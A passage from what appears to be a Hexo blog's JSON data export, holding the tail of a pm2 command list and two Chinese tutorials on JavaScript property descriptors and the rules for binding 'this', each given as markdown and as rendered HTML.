(用于不间断进程)</p>\n<h5 id=\"5-停止\"><a href=\"#5-停止\" class=\"headerlink\" title=\"5. 停止\"></a>5. 停止</h5><p><code>pm2 stop app_id | app_name</code> # 重启<br><code>pm2 stop all</code> # 重启所有进程，相当stop+start</p>\n<h5 id=\"6-删除\"><a href=\"#6-删除\" class=\"headerlink\" title=\"6. 删除\"></a>6. 删除</h5><p><code>pm2 delete app_id | app_name</code>  # 从列表中删除指定的进程<br><code>pm2 delete all</code> # 从列表中删除全部进程<br><code>pm2 kill</code> # 杀死守护进程</p>\n<h5 id=\"7-查看\"><a href=\"#7-查看\" class=\"headerlink\" title=\"7. 查看\"></a>7. 查看</h5><p><code>pm2 list</code> # 查看进程<br><code>pm2 logs</code> # 查看日志<br><code>pm2 show app_name|app_id</code> # 查看进程详情<br><code>pm2 monit</code>  # 查看CPU和内存资源占用</p>\n<h5 id=\"8-启动-HTTP-服务\"><a href=\"#8-启动-HTTP-服务\" class=\"headerlink\" title=\"8. 启动 HTTP 服务\"></a>8. 启动 HTTP 服务</h5><p><code>pm2 serve|expose [options] [path] [port]</code></p>\n<p>例如 <code>pm2 serve ./dist 8888</code>，在 dist 目录启动 http 服务，端口号为 8888</p>\n"},{"title":"JavaScript 属性描述符","date":"2021-04-27T12:24:48.000Z","_content":"\n# 属性描述符\n\n用来描述属性的属性\n\n* 数据属性\n  * `value`：该属性对应的值\n  * `writable`：该属性是否可写\n  * `enumerable`：该属性是否能被枚举（ `for...in` 循环和 `Object.keys()` ）\n  * `configurable`：该属性是否可配置（控制 `writable`、`enumerable`等属性）\n* 访问器属性\n  * `set()`：调用赋值运算符时，执行对应的方法\n  * `get()`：调用.运算符时，执行对应的方法\n\n**note：**\n`value`、`writable` 不可与 `set()`、`get()` 同时存在\n\n```js\nvar obj = {\n  name: \"xxb\"\n};\n\nObject.defineProperty(obj, \"age\", {\n  enumerable: true,\n  configurable: true,\n  get: function () {\n    console.log(\"---\");\n    return 18;\n  },\n  set: function (newVal) {\n    console.log(\"+++++\");\n  }\n});\nobj.age = 1231231;\n```","source":"_posts/JavaScript/JavaScript 属性描述符.md","raw":"---\ntitle: JavaScript 属性描述符\ncategories: JavaScript\ntags: [JavaScript 基础]\ndate: 2021-04-27 20:24:48\n---\n\n# 属性描述符\n\n用来描述属性的属性\n\n* 数据属性\n  * `value`：该属性对应的值\n  * `writable`：该属性是否可写\n  * `enumerable`：该属性是否能被枚举（ `for...in` 循环和 `Object.keys()` ）\n  * `configurable`：该属性是否可配置（控制 `writable`、`enumerable`等属性）\n* 访问器属性\n  * `set()`：调用赋值运算符时，执行对应的方法\n  * `get()`：调用.运算符时，执行对应的方法\n\n**note：**\n`value`、`writable` 不可与 `set()`、`get()` 同时存在\n\n```js\nvar obj = {\n  name: \"xxb\"\n};\n\nObject.defineProperty(obj, \"age\", {\n  enumerable: true,\n  configurable: true,\n  get: function () {\n    console.log(\"---\");\n    return 18;\n  },\n  set: function (newVal) {\n    console.log(\"+++++\");\n  }\n});\nobj.age = 1231231;\n```","slug":"JavaScript/JavaScript 属性描述符","published":1,"updated":"2021-04-27T12:03:52.318Z","_id":"cknzz6sd50000is6retamarf5","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"属性描述符\"><a href=\"#属性描述符\" class=\"headerlink\" title=\"属性描述符\"></a>属性描述符</h1><p>用来描述属性的属性</p>\n<ul>\n<li>数据属性<ul>\n<li><code>value</code>：该属性对应的值</li>\n<li><code>writable</code>：该属性是否可写</li>\n<li><code>enumerable</code>：该属性是否能被枚举（ <code>for...in</code> 循环和 <code>Object.keys()</code> ）</li>\n<li><code>configurable</code>：该属性是否可配置（控制 <code>writable</code>、<code>enumerable</code>等属性）</li>\n</ul>\n</li>\n<li>访问器属性<ul>\n<li><code>set()</code>：调用赋值运算符时，执行对应的方法</li>\n<li><code>get()</code>：调用.运算符时，执行对应的方法</li>\n</ul>\n</li>\n</ul>\n<p><strong>note：</strong><br><code>value</code>、<code>writable</code> 不可与 <code>set()</code>、<code>get()</code> 同时存在</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">&quot;xxb&quot;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(obj, <span class=\"string\">&quot;age&quot;</span>, &#123;</span><br><span class=\"line\">  enumerable: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  configurable: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  get: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;---&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">18</span>;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  set: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">newVal</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;+++++&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">obj.age = <span class=\"number\">1231231</span>;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"属性描述符\"><a href=\"#属性描述符\" class=\"headerlink\" title=\"属性描述符\"></a>属性描述符</h1><p>用来描述属性的属性</p>\n<ul>\n<li>数据属性<ul>\n<li><code>value</code>：该属性对应的值</li>\n<li><code>writable</code>：该属性是否可写</li>\n<li><code>enumerable</code>：该属性是否能被枚举（ <code>for...in</code> 循环和 <code>Object.keys()</code> ）</li>\n<li><code>configurable</code>：该属性是否可配置（控制 <code>writable</code>、<code>enumerable</code>等属性）</li>\n</ul>\n</li>\n<li>访问器属性<ul>\n<li><code>set()</code>：调用赋值运算符时，执行对应的方法</li>\n<li><code>get()</code>：调用.运算符时，执行对应的方法</li>\n</ul>\n</li>\n</ul>\n<p><strong>note：</strong><br><code>value</code>、<code>writable</code> 不可与 <code>set()</code>、<code>get()</code> 同时存在</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">&quot;xxb&quot;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(obj, <span class=\"string\">&quot;age&quot;</span>, &#123;</span><br><span class=\"line\">  enumerable: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  configurable: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  get: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;---&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">18</span>;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  set: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">newVal</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;+++++&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">obj.age = <span class=\"number\">1231231</span>;</span><br></pre></td></tr></table></figure>"},{"title":"this 指向","date":"2021-04-27T09:24:48.000Z","_content":"\n# this 指向\n\n### 1、默认绑定\n\n独立函数调用时应用了 `this` 的默认绑定，`this` 指向全局对象\n\n\n> 如果使用严格模式（`use strict;`），那么全局对象将无法使用默认绑定，因此 `this` 会绑定到 `undefined`\n> node 环境中，每个模块被 `function (exports, require, module, __filename, __dirname) {...}` 包裹，所以 `this` 是 `{}` 对象，而函数中的 `this` 是 `global` 对象，而且通过 `var` 声明的变量不会挂载在 `global` 对象下\n\n\n```js\n// ---- 浏览器环境中 非严格模式------\nvar a = 2;\nconsole.log(this); // window 对象\nfunction foo () {\n    console.log(this); // window 对象\n    console.log(this.a); // 2\n}\nfoo(); // 2\n\n```\n\n```js\n// ---- 浏览器环境中 严格模式------\n\"use strict\";\nvar a = 2;\nconsole.log(this); // window 对象\nfunction foo () {\n    console.log(this); // undefined\n    console.log(this.a); // TypeError\n}\nfoo(); // 2\n\n```\n\n```js\n// ---- node 环境中 ------\nvar a = 2;\nconsole.log(this); // {}\nfunction foo () {\n    console.log(this); // global 对象\n    console.log(this.a); // undefined\n}\nfoo(); // 2\n```\n\n### 2、隐式绑定\n\n调用位置是否有上下文对象（即该方法是否被某个对象所拥有），隐式绑定规则会把函数调用中的 `this` 绑定到这个上下文对象。\n\n> 无论是直接在 obj 中定义还是先定义再添加为引用属性，这个函数严格来说都不属于 obj 对象（可以赋值给其他对象，改变上下文），调用位置会使用 obj 上下文来引用函数，因此可以说函数被调用时obj 对象“拥有”它\n\n```js\n// 对象属性引用链中只有最后一层会影响调用位置\nfunction foo() {\n    console.log(this.a);\n}\n\nvar obj2 = {\n    a: 42,\n    foo\n};\nvar obj1 = {\n    a: 2,\n    obj2\n};\n\nobj1.obj2.foo(); // 42\n\n```\n\n```js\n//  ** 隐式丢失 **\n//  被隐式绑定的函数丢失了绑定对象，则这个换上会应用默认绑定，从而把 this 绑定到全局对象或者 undefined \n//  `bar` 是 `obj.foo` 的一个引用，但实际上，它引用的是 `foo` 函数本身，此时的 `bar()` 其实是一个不带任何修饰的函数调用，应用了默认绑定。\nvar obj = {\n    a: 2,\n    foo: function () {\n        console.log(this.a);\n    }\n};\nvar bar = obj.foo; // 函数别名！\nvar a = \"oops, global\"; // a 是全局对象的属性\nbar(); // \"oops, global\"\n\n```\n\n> 回调函数会使 `this` 丢失或被修改\n\n### 3、显式绑定\n\n使用 `call()`、`apply()`、`bind()` 方法绑定 `this` 对象，动态切换上下文。\n\n```js\n// obj 对象绑定到 foo 函数\nfunction foo() {\n    console.log( this.a );\n}\nvar obj = {\n    a: 2\n};\nfoo.call( obj ); // 2\n\n```\n\n> `bind()` 会返回一个硬编码的新函数，它会把参数设置为 `this` 的上下文并调用原始函数\n\n### 4、new 绑定\n\n发生函数调用时，会进行以下步骤：\n\n1.  创建（或者说构造）一个全新的对象。\n2.  这个新对象会被执行 [[ 原型 ]] 连接。\n3.  这个新对象会绑定到函数调用的 this 。\n4.  如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。\n\n```js\nfunction foo(a) {\n    this.a = a;\n}\nvar bar = new foo(2);\nconsole.log( bar.a ); // 2\n\n```\n\n### 5、箭头函数\n\n箭头函数不使用 `this` 的四种标准规则，而是根据外层的词法作用域（函数或全局）来决定 `this` 。\n\n```js\nfunction foo() {\n  setTimeout(() => {\n    console.log('id:', this.id);\n  }, 100);\n}\nvar id = 21;\nfoo.call({ id: 42 }); // output ------> 42\n\n// ------ 使用 traceur 编译后的代码如下： -----\nfunction foo() {\n  var $__1 = this;\n  setTimeout(function() {\n    console.log('id:', $__1.id);\n  }, 100);\n}\nvar id = 21;\nfoo({id: 42});  // output ------> 42\n\n```\n\n### 6、常见 this 指向总结\n1.  在全局环境下，即在任何函数体外，`this` 指向全局对象（`window` 、`global`）；\n2.  函数直接调用时，`this` 指向全局对象，如执行函数中嵌套的函数；\n3.  对象方法中的 `this` ，与调用该方法的对象绑定；\n4.  构造函数中的 `this` ，与即将被创建的新对象绑定；\n5.  通过 `call` 和 `apply` 调用，函数中的 `this` 被动态绑定到第一个元素 ；\n6.  通过 `bind` 方法传入对象，函数中`this` 将永久地被绑定到了 `bind` 的第一个参数；\n7.  事件处理函数中的 `this`，指向监听器所在的 `DOM` 元素，与 `event.currentTarget` 一致；\n\n\n### 7、判断 this 指向的步骤 \n1. 首先查看函数调用的位置\n2. 看这个函数是否被显示的使用 `call`、 `apply`、 `bind` 等显示绑定，如果是，则会在代码中明确说明 `this` 的指向，否则进行下一步\n3. 看这个函数是被谁（对象、数组、函数等）调用，如果是用 `.` 操作符调用，则 `this` 指向该对象，否则进行下一步\n4. 是否使用 `new` 关键字调用了该函数，如果是，`this` 指向由 JavaScript 解释器创建的新创建的对象，否则进行下一步\n5. 是否在箭头函数中使用 `this`，如果是，则 `this` 指向父作用域中的上下文对象，否则进行下一步\n6. 如果是使用严格模式，则 `this` 关键字是未定义的，否则 `this` 指向全局对象 `window` 或 `global`\n\n\n### 8、注意事项\n1. 函数的执行过程中调用位置如何决定 `this` 的绑定对象\n2. 如果把 `null` 或者 `undefined` 作为 `this` 的绑定对象传入 `call` 、 `apply` 或者 `bind` ，这些值在调用时会被忽略，实际应用的是默认绑定规则\n3. 绑定优先级：new 绑定 > 显式绑定 > 隐身绑定 > 默认绑定","source":"_posts/JavaScript/this 指向.md","raw":"---\ntitle: this 指向\ncategories: JavaScript\ntags: [JavaScript 原理]\ndate: 2021-04-27 17:24:48\n---\n\n# this 指向\n\n### 1、默认绑定\n\n独立函数调用时应用了 `this` 的默认绑定，`this` 指向全局对象\n\n\n> 如果使用严格模式（`use strict;`），那么全局对象将无法使用默认绑定，因此 `this` 会绑定到 `undefined`\n> node 环境中，每个模块被 `function (exports, require, module, __filename, __dirname) {...}` 包裹，所以 `this` 是 `{}` 对象，而函数中的 `this` 是 `global` 对象，而且通过 `var` 声明的变量不会挂载在 `global` 对象下\n\n\n```js\n// ---- 浏览器环境中 非严格模式------\nvar a = 2;\nconsole.log(this); // window 对象\nfunction foo () {\n    console.log(this); // window 对象\n    console.log(this.a); // 2\n}\nfoo(); // 2\n\n```\n\n```js\n// ---- 浏览器环境中 严格模式------\n\"use strict\";\nvar a = 2;\nconsole.log(this); // window 对象\nfunction foo () {\n    console.log(this); // undefined\n    console.log(this.a); // TypeError\n}\nfoo(); // 2\n\n```\n\n```js\n// ---- node 环境中 ------\nvar a = 2;\nconsole.log(this); // {}\nfunction foo () {\n    console.log(this); // global 对象\n    console.log(this.a); // undefined\n}\nfoo(); // 2\n```\n\n### 2、隐式绑定\n\n调用位置是否有上下文对象（即该方法是否被某个对象所拥有），隐式绑定规则会把函数调用中的 `this` 绑定到这个上下文对象。\n\n> 无论是直接在 obj 中定义还是先定义再添加为引用属性，这个函数严格来说都不属于 obj 对象（可以赋值给其他对象，改变上下文），调用位置会使用 obj 上下文来引用函数，因此可以说函数被调用时obj 对象“拥有”它\n\n```js\n// 对象属性引用链中只有最后一层会影响调用位置\nfunction foo() {\n    console.log(this.a);\n}\n\nvar obj2 = {\n    a: 42,\n    foo\n};\nvar obj1 = {\n    a: 2,\n    obj2\n};\n\nobj1.obj2.foo(); // 42\n\n```\n\n```js\n//  ** 隐式丢失 **\n//  被隐式绑定的函数丢失了绑定对象，则这个换上会应用默认绑定，从而把 this 绑定到全局对象或者 undefined \n//  `bar` 是 `obj.foo` 的一个引用，但实际上，它引用的是 `foo` 函数本身，此时的 `bar()` 其实是一个不带任何修饰的函数调用，应用了默认绑定。\nvar obj = {\n    a: 2,\n    foo: function () {\n        console.log(this.a);\n    }\n};\nvar bar = obj.foo; // 函数别名！\nvar a = \"oops, global\"; // a 是全局对象的属性\nbar(); // \"oops, global\"\n\n```\n\n> 回调函数会使 `this` 丢失或被修改\n\n### 3、显式绑定\n\n使用 `call()`、`apply()`、`bind()` 方法绑定 `this` 对象，动态切换上下文。\n\n```js\n// obj 对象绑定到 foo 函数\nfunction foo() {\n    console.log( this.a );\n}\nvar obj = {\n    a: 2\n};\nfoo.call( obj ); // 2\n\n```\n\n> `bind()` 会返回一个硬编码的新函数，它会把参数设置为 `this` 的上下文并调用原始函数\n\n### 4、new 绑定\n\n发生函数调用时，会进行以下步骤：\n\n1.  创建（或者说构造）一个全新的对象。\n2.  这个新对象会被执行 [[ 原型 ]] 连接。\n3.  这个新对象会绑定到函数调用的 this 。\n4.  如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。\n\n```js\nfunction foo(a) {\n    this.a = a;\n}\nvar bar = new foo(2);\nconsole.log( bar.a ); // 2\n\n```\n\n### 5、箭头函数\n\n箭头函数不使用 `this` 的四种标准规则，而是根据外层的词法作用域（函数或全局）来决定 `this` 。\n\n```js\nfunction foo() {\n  setTimeout(() => {\n    console.log('id:', this.id);\n  }, 100);\n}\nvar id = 21;\nfoo.call({ id: 42 }); // output ------> 42\n\n// ------ 使用 traceur 编译后的代码如下： -----\nfunction foo() {\n  var $__1 = this;\n  setTimeout(function() {\n    console.log('id:', $__1.id);\n  }, 100);\n}\nvar id = 21;\nfoo({id: 42});  // output ------> 42\n\n```\n\n### 6、常见 this 指向总结\n1.  在全局环境下，即在任何函数体外，`this` 指向全局对象（`window` 、`global`）；\n2.  函数直接调用时，`this` 指向全局对象，如执行函数中嵌套的函数；\n3.  对象方法中的 `this` ，与调用该方法的对象绑定；\n4.  构造函数中的 `this` ，与即将被创建的新对象绑定；\n5.  通过 `call` 和 `apply` 调用，函数中的 `this` 被动态绑定到第一个元素 ；\n6.  通过 `bind` 方法传入对象，函数中`this` 将永久地被绑定到了 `bind` 的第一个参数；\n7.  事件处理函数中的 `this`，指向监听器所在的 `DOM` 元素，与 `event.currentTarget` 一致；\n\n\n### 7、判断 this 指向的步骤 \n1. 首先查看函数调用的位置\n2. 看这个函数是否被显示的使用 `call`、 `apply`、 `bind` 等显示绑定，如果是，则会在代码中明确说明 `this` 的指向，否则进行下一步\n3. 看这个函数是被谁（对象、数组、函数等）调用，如果是用 `.` 操作符调用，则 `this` 指向该对象，否则进行下一步\n4. 是否使用 `new` 关键字调用了该函数，如果是，`this` 指向由 JavaScript 解释器创建的新创建的对象，否则进行下一步\n5. 是否在箭头函数中使用 `this`，如果是，则 `this` 指向父作用域中的上下文对象，否则进行下一步\n6. 如果是使用严格模式，则 `this` 关键字是未定义的，否则 `this` 指向全局对象 `window` 或 `global`\n\n\n### 8、注意事项\n1. 函数的执行过程中调用位置如何决定 `this` 的绑定对象\n2. 如果把 `null` 或者 `undefined` 作为 `this` 的绑定对象传入 `call` 、 `apply` 或者 `bind` ，这些值在调用时会被忽略，实际应用的是默认绑定规则\n3. 绑定优先级：new 绑定 > 显式绑定 > 隐身绑定 > 默认绑定","slug":"JavaScript/this 指向","published":1,"updated":"2021-04-27T12:01:49.476Z","_id":"cknzzafoq0006is6r4yqgew4n","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"this-指向\"><a href=\"#this-指向\" class=\"headerlink\" title=\"this 指向\"></a>this 指向</h1><h3 id=\"1、默认绑定\"><a href=\"#1、默认绑定\" class=\"headerlink\" title=\"1、默认绑定\"></a>1、默认绑定</h3><p>独立函数调用时应用了 <code>this</code> 的默认绑定，<code>this</code> 指向全局对象</p>\n<blockquote>\n<p>如果使用严格模式（<code>use strict;</code>），那么全局对象将无法使用默认绑定，因此 <code>this</code> 会绑定到 <code>undefined</code><br>node 环境中，每个模块被 <code>function (exports, require, module, __filename, __dirname) &#123;...&#125;</code> 包裹，所以 <code>this</code> 是 <code>&#123;&#125;</code> 对象，而函数中的 <code>this</code> 是 <code>global</code> 对象，而且通过 <code>var</code> 声明的变量不会挂载在 <code>global</code> 对象下</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ---- 浏览器环境中 非严格模式------</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// window 对象</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// window 对象</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.a); <span class=\"comment\">// 2</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(); <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ---- 浏览器环境中 严格模式------</span></span><br><span class=\"line\"><span class=\"meta\">&quot;use strict&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// window 对象</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.a); <span class=\"comment\">// TypeError</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(); <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ---- node 环境中 ------</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// &#123;&#125;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// global 对象</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.a); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(); <span class=\"comment\">// 2</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2、隐式绑定\"><a href=\"#2、隐式绑定\" class=\"headerlink\" title=\"2、隐式绑定\"></a>2、隐式绑定</h3><p>调用位置是否有上下文对象（即该方法是否被某个对象所拥有），隐式绑定规则会把函数调用中的 <code>this</code> 绑定到这个上下文对象。</p>\n<blockquote>\n<p>无论是直接在 obj 中定义还是先定义再添加为引用属性，这个函数严格来说都不属于 obj 对象（可以赋值给其他对象，改变上下文），调用位置会使用 obj 上下文来引用函数，因此可以说函数被调用时obj 对象“拥有”它</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 对象属性引用链中只有最后一层会影响调用位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj2 = &#123;</span><br><span class=\"line\">    a: <span class=\"number\">42</span>,</span><br><span class=\"line\">    foo</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj1 = &#123;</span><br><span class=\"line\">    a: <span class=\"number\">2</span>,</span><br><span class=\"line\">    obj2</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">obj1.obj2.foo(); <span class=\"comment\">// 42</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//  ** 隐式丢失 **</span></span><br><span class=\"line\"><span class=\"comment\">//  被隐式绑定的函数丢失了绑定对象，则这个换上会应用默认绑定，从而把 this 绑定到全局对象或者 undefined </span></span><br><span class=\"line\"><span class=\"comment\">//  `bar` 是 `obj.foo` 的一个引用，但实际上，它引用的是 `foo` 函数本身，此时的 `bar()` 其实是一个不带任何修饰的函数调用，应用了默认绑定。</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    a: <span class=\"number\">2</span>,</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.a);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> bar = obj.foo; <span class=\"comment\">// 函数别名！</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"string\">&quot;oops, global&quot;</span>; <span class=\"comment\">// a 是全局对象的属性</span></span><br><span class=\"line\">bar(); <span class=\"comment\">// &quot;oops, global&quot;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>回调函数会使 <code>this</code> 丢失或被修改</p>\n</blockquote>\n<h3 id=\"3、显式绑定\"><a href=\"#3、显式绑定\" class=\"headerlink\" title=\"3、显式绑定\"></a>3、显式绑定</h3><p>使用 <code>call()</code>、<code>apply()</code>、<code>bind()</code> 方法绑定 <code>this</code> 对象，动态切换上下文。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// obj 对象绑定到 foo 函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( <span class=\"built_in\">this</span>.a );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    a: <span class=\"number\">2</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">foo.call( obj ); <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p><code>bind()</code> 会返回一个硬编码的新函数，它会把参数设置为 <code>this</code> 的上下文并调用原始函数</p>\n</blockquote>\n<h3 id=\"4、new-绑定\"><a href=\"#4、new-绑定\" class=\"headerlink\" title=\"4、new 绑定\"></a>4、new 绑定</h3><p>发生函数调用时，会进行以下步骤：</p>\n<ol>\n<li> 创建（或者说构造）一个全新的对象。</li>\n<li> 这个新对象会被执行 [[ 原型 ]] 连接。</li>\n<li> 这个新对象会绑定到函数调用的 this 。</li>\n<li> 如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span 